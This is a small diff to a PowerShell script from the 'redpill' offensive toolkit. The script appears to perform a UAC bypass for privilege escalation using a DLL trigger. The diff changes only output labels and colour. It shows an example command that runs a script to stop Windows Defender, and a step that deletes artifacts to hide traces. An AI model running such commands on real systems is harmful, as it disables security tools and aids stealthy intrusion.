@@ -68,7 +68,7 @@
    UAC State    : Enabled
    UAC Settings : Notify Me
    EOP Trigger  : C:\Users\pedro\AppData\Local\Temp\DavSyncProvider.dll
-   Execute      : powershell -file C:\Users\pedro\AppData\Local\Temp\DisableDefender.ps1 -Action Stop
+   cmdline      : powershell -file C:\Users\pedro\AppData\Local\Temp\DisableDefender.ps1 -Action Stop
    
 .LINK
    https://github.com/r00t-3xp10it/redpill
@@ -417,8 +417,8 @@ ShortSvcName=`"`"CorpVPN`"`"
    ## Build Output Table
    Write-Host "`nUAC State    : $UacStatus"
    Write-Host "UAC Settings : $UacSettings"
-   Write-Host "EOP Trigger  : $Env:TMP\DavSyncProvider.dll"
-   Write-Host "Execute      : $Execute"
+   Write-Host "EOP Trigger  : $Env:TMP\DavSyncProvider.dll" -ForeGroudColor Yellow
+   Write-Host "RUN cmdline  : $Execute"
    
    ## Clean ALL artifacts left behind!
    Remove-Item -Path "$Env:TMP\graca.log" -EA SilentlyContinue -Force
